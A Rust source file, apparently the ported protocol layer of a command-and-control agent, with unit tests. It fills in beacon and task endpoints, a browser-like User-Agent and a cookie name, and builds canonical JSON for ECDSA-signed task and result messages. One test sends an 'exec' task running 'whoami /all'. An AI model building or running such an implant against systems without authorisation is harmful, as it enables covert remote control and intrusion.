//! Inherent methods on the wire types.
//!
//! Port of `protocol/methods.go`: `Profile::resolved`,
//! `Task::unsigned`, `Result::signable`, and `canonical_json`.
//!
//! # `canonical_json` and serde_json
//!
//! Go's `canonicalJSON` is `json.Encoder` with
//! `SetEscapeHTML(false)` and a trailing-newline trim. On a
//! `map[string]interface{}`, `json.Marshal` emits keys in
//! alphabetical order — Go's `encoding/json` sorts map keys by
//! design.
//!
//! `serde_json::to_vec` on a `serde_json::Value::Object`
//! produces the same output: serde_json's `Map` is a `BTreeMap`
//! unless the `preserve_order` feature is enabled (it is not),
//! so keys are alphabetical. `to_vec` emits no trailing
//! newline. Neither side escapes `<`, `>`, or `&` by default,
//! matching Go with `SetEscapeHTML(false)`.
//!
//! The two implementations are wire-identical. A signature
//! produced by one verifies against the other.

use std::collections::BTreeMap;

use serde::Serialize;
use serde_json::{json, Value};

use super::{Profile, ProfileStatus, Task, TaskResult};

impl Profile {
    /// Fill in every default the Go tree filled in, and resolve
    /// the platform-specific User-Agent.
    ///
    /// Consumes and returns `self`, matching the Go pattern
    /// `prof = prof.Resolved()`.
    pub fn resolved(mut self) -> Self {
        // ---- User-Agent selection ---------------------------
        //
        // `runtime.GOOS == "linux"` in Go is the OS the binary
        // was built for. `cfg!(target_os = ...)` in Rust is the
        // same thing.
        if cfg!(target_os = "linux") && !self.linux_user_agent.is_empty()
        {
            self.user_agent = self.linux_user_agent.clone();
        }
        if self.user_agent.is_empty() {
            self.user_agent = if cfg!(target_os = "linux") {
                "Mozilla/5.0 (X11; Linux x86_64)".to_string()
            } else {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                    .to_string()
            };
        }

        // ---- Paths -----------------------------------------
        if self.beacon_path.is_empty() {
            self.beacon_path = "/beacon".to_string();
        }
        if self.tasks_path.is_empty() {
            self.tasks_path = "/tasks".to_string();
        }
        if self.results_path.is_empty() {
            self.results_path = "/results".to_string();
        }

        // ---- Header maps -----------------------------------
        //
        // Go initialises nil maps to `{}`. Rust's `BTreeMap`
        // default is already `{}`; the check is a no-op that
        // documents the intent.
        if self.extra_headers.is_empty() {
            self.extra_headers = BTreeMap::new();
        }
        if self.request_headers.is_empty() {
            self.request_headers = BTreeMap::new();
        }

        // ---- Cookie name -----------------------------------
        if self.cookie_name.is_empty() {
            self.cookie_name = "sid".to_string();
        }

        // ---- Status codes ----------------------------------
        let status = self.status.get_or_insert_with(ProfileStatus::default);
        if status.beacon == 0 {
            status.beacon = 200;
        }
        if status.tasks == 0 {
            status.tasks = 200;
        }
        if status.results == 0 {
            status.results = 204;
        }
        if status.error == 0 {
            status.error = 404;
        }

        self
    }
}

impl Task {
    /// Produce the byte sequence the server signed.
    ///
    /// The payload is the canonical JSON of
    /// `{args, id, timeout, verb}` — keys sorted alphabetically,
    /// no whitespace, no trailing newline. The `args` array is
    /// always present (`[]` when empty), matching Go's
    /// `args := []string{}; args = append(args, t.Args...)`
    /// even if `t.Args` was `nil`.
    ///
    /// A signature produced over these bytes by the server
    /// verifies with `p256::ecdsa::VerifyingKey::verify_prehash`
    /// on `SHA-256(bytes)`.
    pub fn unsigned(&self) -> Result<Vec<u8>, serde_json::Error> {
        canonical_json(&json!({
            "args": &self.args,
            "id": &self.id,
            "timeout": self.timeout,
            "verb": &self.verb,
        }))
    }
}

impl TaskResult {
    /// Produce the byte sequence the agent signs.
    ///
    /// The payload is the canonical JSON of
    /// `{error, exit_code, id, output}` — keys sorted
    /// alphabetically, no whitespace, no trailing newline.
    /// `error` is included unconditionally, even when empty,
    /// matching Go's `map[string]interface{}{"error": r.Error,
    /// ...}` with `r.Error` an empty string.
    ///
    /// The server verifies the signature over these bytes
    /// before delivering the output to the waiting task.
    pub fn signable(&self) -> Result<Vec<u8>, serde_json::Error> {
        canonical_json(&json!({
            "error": &self.error,
            "exit_code": self.exit_code,
            "id": &self.id,
            "output": &self.output,
        }))
    }
}

/// Encode `value` as canonical JSON: sorted keys, no
/// whitespace, no trailing newline, no HTML escaping.
///
/// Matches Go's `canonicalJSON` output byte-for-byte on the
/// types this module uses. See the module doc for the
/// serde_json-vs-Go analysis.
fn canonical_json<T: Serialize>(value: &T) -> Result<Vec<u8>, serde_json::Error> {
    let value = serde_json::to_value(value)?;
    // Ensure `value` is `Value` so we can inspect it if needed.
    // `to_vec` on the `Value` produces the canonical bytes.
    serde_json::to_vec(&value)
}

// =====================================================================
// Tests
// =====================================================================

#[cfg(test)]
mod tests {
    use super::*;

    // -------------------- canonical_json --------------------

    #[test]
    fn canonical_json_sorts_keys() {
        // Go's `json.Marshal` on a map sorts keys. serde_json
        // on Value::Object does the same.
        let v = json!({"z": 1, "a": 2, "m": 3});
        let bytes = serde_json::to_vec(&v).unwrap();
        assert_eq!(bytes, br#"{"a":2,"m":3,"z":1}"#);
    }

    #[test]
    fn canonical_json_no_whitespace() {
        let v = json!({"a": [1, 2, 3], "b": {"c": "d"}});
        let bytes = serde_json::to_vec(&v).unwrap();
        let s = std::str::from_utf8(&bytes).unwrap();
        assert!(!s.contains(' '));
        assert!(!s.contains('\n'));
        assert!(!s.contains('\t'));
    }

    #[test]
    fn canonical_json_no_html_escape() {
        // The `<`, `>`, and `&` characters pass through
        // unescaped, matching Go's `SetEscapeHTML(false)`.
        let v = json!({"x": "<script>a&b</script>"});
        let bytes = serde_json::to_vec(&v).unwrap();
        let s = std::str::from_utf8(&bytes).unwrap();
        assert!(s.contains("<script>a&b</script>"));
        assert!(!s.contains("\\u003c"));
        assert!(!s.contains("\\u0026"));
    }

    // -------------------- Task::unsigned --------------------

    #[test]
    fn unsigned_includes_all_four_fields() {
        let t = Task {
            id: "abc".to_string(),
            verb: "ps".to_string(),
            args: vec![],
            timeout: 30,
            signature: String::new(),
        };
        let body = t.unsigned().unwrap();
        let s = std::str::from_utf8(&body).unwrap();
        assert_eq!(
            s,
            r#"{"args":[],"id":"abc","timeout":30,"verb":"ps"}"#
        );
    }

    #[test]
    fn unsigned_includes_empty_args_as_array() {
        // Even with no args, the field is `[]` (not missing,
        // not null), matching the Go tree's `args :=
        // []string{}; args = append(args, t.Args...)`.
        let t = Task {
            id: "x".to_string(),
            verb: "cat".to_string(),
            args: vec![],
            timeout: 5,
            signature: String::new(),
        };
        let body = t.unsigned().unwrap();
        let s = std::str::from_utf8(&body).unwrap();
        assert!(s.contains(r#""args":[]"#));
    }

    #[test]
    fn unsigned_includes_args_when_present() {
        let t = Task {
            id: "x".to_string(),
            verb: "exec".to_string(),
            args: vec!["whoami".to_string(), "/all".to_string()],
            timeout: 10,
            signature: String::new(),
        };
        let body = t.unsigned().unwrap();
        let s = std::str::from_utf8(&body).unwrap();
        assert_eq!(
            s,
            r#"{"args":["whoami","/all"],"id":"x","timeout":10,"verb":"exec"}"#
        );
    }

    #[test]
    fn unsigned_does_not_include_signature() {
        let t = Task {
            id: "x".to_string(),
            verb: "ps".to_string(),
            args: vec![],
            timeout: 5,
            signature: "some-sig".to_string(),
        };
        let body = t.unsigned().unwrap();
        let s = std::str::from_utf8(&body).unwrap();
        assert!(!s.contains("signature"));
    }

    // -------------------- Result::signable --------------------

    #[test]
    fn signable_includes_empty_error_as_string() {
        // Go includes `error` unconditionally — even an empty
        // string. This is different from the wire form, which
        // omits an empty error via `omitempty`.
        let r = TaskResult {
            id: "x".to_string(),
            output: "ok".to_string(),
            error: String::new(),
            exit_code: 0,
            signature: String::new(),
        };
        let body = r.signable().unwrap();
        let s = std::str::from_utf8(&body).unwrap();
        assert_eq!(
            s,
            r#"{"error":"","exit_code":0,"id":"x","output":"ok"}"#
        );
    }

    #[test]
    fn signable_includes_error_when_present() {
        let r = TaskResult {
            id: "x".to_string(),
            output: String::new(),
            error: "something broke".to_string(),
            exit_code: 1,
            signature: String::new(),
        };
        let body = r.signable().unwrap();
        let s = std::str::from_utf8(&body).unwrap();
        assert_eq!(
            s,
            r#"{"error":"something broke","exit_code":1,"id":"x","output":""}"#
        );
    }

    #[test]
    fn signable_does_not_include_signature() {
        let r = TaskResult {
            id: "x".to_string(),
            output: "ok".to_string(),
            error: String::new(),
            exit_code: 0,
            signature: "some-sig".to_string(),
        };
        let body = r.signable().unwrap();
        let s = std::str::from_utf8(&body).unwrap();
        assert!(!s.contains("signature"));
    }

    // -------------------- Profile::resolved --------------------

    #[test]
    fn resolved_fills_all_defaults() {
        let p = Profile::default().resolved();
        assert!(!p.user_agent.is_empty());
        assert_eq!(p.beacon_path, "/beacon");
        assert_eq!(p.tasks_path, "/tasks");
        assert_eq!(p.results_path, "/results");
        assert_eq!(p.cookie_name, "sid");
        let s = p.status.as_ref().unwrap();
        assert_eq!(s.beacon, 200);
        assert_eq!(s.tasks, 200);
        assert_eq!(s.results, 204);
        assert_eq!(s.error, 404);
    }

    #[test]
    fn resolved_preserves_explicit_values() {
        let p = Profile {
            user_agent: "custom".to_string(),
            beacon_path: "/x/init".to_string(),
            tasks_path: "/x/poll".to_string(),
            results_path: "/x/event".to_string(),
            cookie_name: "session".to_string(),
            status: Some(ProfileStatus {
                beacon: 201,
                tasks: 200,
                results: 204,
                error: 404,
            }),
            ..Default::default()
        }
        .resolved();
        assert_eq!(p.user_agent, "custom");
        assert_eq!(p.beacon_path, "/x/init");
        assert_eq!(p.cookie_name, "session");
        assert_eq!(p.status.as_ref().unwrap().beacon, 201);
    }

    #[test]
    fn resolved_low_linux_ua_override_applies_on_linux() {
        let p = Profile {
            user_agent: "general".to_string(),
            linux_user_agent: "linux".to_string(),
            ..Default::default()
        }
        .resolved();
        if cfg!(target_os = "linux") {
            assert_eq!(p.user_agent, "linux");
        } else {
            assert_eq!(p.user_agent, "general");
        }
    }
}